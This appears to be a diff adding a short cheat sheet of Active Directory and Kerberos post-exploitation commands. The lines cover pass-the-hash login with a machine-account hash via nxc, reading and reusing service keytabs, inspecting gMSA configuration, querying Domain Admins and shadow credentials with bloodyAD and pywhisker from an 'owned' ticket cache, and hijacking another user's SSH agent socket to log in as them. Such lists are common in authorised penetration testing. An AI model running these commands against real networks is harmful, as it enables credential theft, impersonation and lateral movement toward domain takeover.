+nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
+klist -k /etc/krb5.keytab
+ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
+kvno ldap/dc.domain.local
+KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'
+KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local --target 'WEB01$' --action list
+grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
+find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null
+klist -kt /etc/krb5.keytab
+klist -kt /etc/service.keytab
+kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
+ls -la /run/user/*/ssh-* /tmp/ssh-* 2>/dev/null
+find /run/user /tmp -type s -name 'agent.*' 2>/dev/null
+SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
